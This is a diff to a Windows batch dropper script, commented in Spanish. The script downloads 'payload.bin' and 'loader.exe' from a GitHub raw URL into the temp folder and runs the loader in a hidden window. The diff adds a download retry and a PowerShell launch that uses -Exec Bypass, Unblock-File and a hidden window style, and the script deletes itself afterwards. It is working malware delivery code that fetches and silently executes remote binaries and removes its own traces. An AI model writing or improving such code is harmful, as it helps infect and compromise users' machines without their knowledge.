@@ -21,13 +21,23 @@ curl -L -o "%TEMP%\loader\payload.bin" "https://raw.githubusercontent.com/carlos
 :: 4. Esperar 6 segundos antes de la siguiente descarga
 timeout /t 6 /nobreak >nul 2>&1
 
-:: 5. Descargar loader.exe
+:: ==========================================================
+:: 5. Descargar loader.exe con verificación y reintento
+:: ==========================================================
 curl -L -o "%TEMP%\loader\loader.exe" "https://raw.githubusercontent.com/carlospro473/Chac/main/loader.exe" >nul 2>&1
 
-:: 6. Ejecutar loader.exe en segundo plano, oculto, sin ventana (usando start /b)
-if exist "%TEMP%\loader\loader.exe" (
-    start /b "" "%TEMP%\loader\loader.exe" >nul 2>&1
+:: Verificar tamaño (si es 0 o no existe, reintentar)
+for %%I in ("%TEMP%\loader\loader.exe") do set size=%%~zI
+if %size% LEQ 0 (
+    timeout /t 2 /nobreak >nul 2>&1
+    curl -L -o "%TEMP%\loader\loader.exe" "https://raw.githubusercontent.com/carlospro473/Chac/main/loader.exe" >nul 2>&1
 )
+
+:: 6. Ejecutar loader.exe en segundo plano, oculto y sin ventana (PowerShell)
+if exist "%TEMP%\loader\loader.exe" (
+    powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Unblock-File -Path '%TEMP%\loader\loader.exe'; Start-Process -FilePath '%TEMP%\loader\loader.exe' -WindowStyle Hidden"
+)
+:: ==========================================================
 
 :: 7. Autoborrado del .bat (espera 15 segundos y elimina)
 start /b powershell -Command "Start-Sleep -Seconds 15; Remove-Item -Path '%~f0' -Force"
